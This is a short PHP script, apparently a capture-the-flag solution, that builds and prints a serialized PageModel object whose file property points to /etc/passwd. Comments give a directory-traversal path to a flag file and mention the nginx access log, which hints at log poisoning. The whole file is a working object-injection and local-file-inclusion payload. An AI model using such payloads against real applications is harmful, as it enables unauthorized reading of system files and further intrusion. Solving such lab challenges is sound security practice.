<?php

include "models/PageModel.php";

$p = new PageModel;
// $p->file = '../../../../../../../../../../../../flag';
$p->file = '/etc/passwd';
// /var/log/nginx/access.log 

echo serialize($p);
//O:9:"PageModel":1:{s:4:"file";s:28:"../../../../../../etc/passwd";}